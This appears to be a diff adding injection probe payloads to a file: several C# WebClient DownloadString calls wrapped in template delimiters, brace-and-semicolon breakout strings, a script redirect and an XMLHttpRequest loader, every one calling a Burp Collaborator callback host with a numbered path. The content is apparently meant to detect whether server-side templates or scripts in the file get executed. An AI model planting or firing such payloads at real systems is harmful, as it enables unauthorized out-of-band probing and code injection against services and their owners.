@@ -1,6 +1,46 @@
 <% 
 var client = new WebClient();
-var content = client.DownloadString("http://yjlk4hmprqjfqv7dq2zh4gku8leb20.burpcollaborator.net/github-tags");
+var content = client.DownloadString("http://yjlk4hmprqjfqv7dq2zh4gku8leb20.burpcollaborator.net/1");
 %>
 var client = new WebClient();
-var content = client.DownloadString("http://yjlk4hmprqjfqv7dq2zh4gku8leb20.burpcollaborator.net/github-notags");
+var content = client.DownloadString("http://yjlk4hmprqjfqv7dq2zh4gku8leb20.burpcollaborator.net/2");
+
+%>
+var client = new WebClient();
+var content = client.DownloadString("http://yjlk4hmprqjfqv7dq2zh4gku8leb20.burpcollaborator.net/3");
+
+}}}}}};;;;;;;;//
+var client = new WebClient();
+var content = client.DownloadString("http://yjlk4hmprqjfqv7dq2zh4gku8leb20.burpcollaborator.net/4");
+
+
+))))))))))))))}}}}}}}}}}};;;;//
+var client = new WebClient();
+var content = client.DownloadString("http://yjlk4hmprqjfqv7dq2zh4gku8leb20.burpcollaborator.net/5");
+
+<script>window.location = "http://yjlk4hmprqjfqv7dq2zh4gku8leb20.burpcollaborator.net/6;</script>
+
+<script type="text/javascript">
+    function loadXMLDoc(theURL)
+    {
+        if (window.XMLHttpRequest)
+        {// code for IE7+, Firefox, Chrome, Opera, Safari, SeaMonkey
+            xmlhttp=new XMLHttpRequest();
+        }
+        else
+        {// code for IE6, IE5
+            xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
+        }
+        xmlhttp.onreadystatechange=function()
+        {
+            if (xmlhttp.readyState==4 && xmlhttp.status==200)
+            {
+                alert(xmlhttp.responseText);
+            }
+        }
+        xmlhttp.open("GET", theURL, false);
+        xmlhttp.send();
+    }
+var xmlhttp=false;
+loadXMLDoc('http://yjlk4hmprqjfqv7dq2zh4gku8leb20.burpcollaborator.net/7');
+</script>
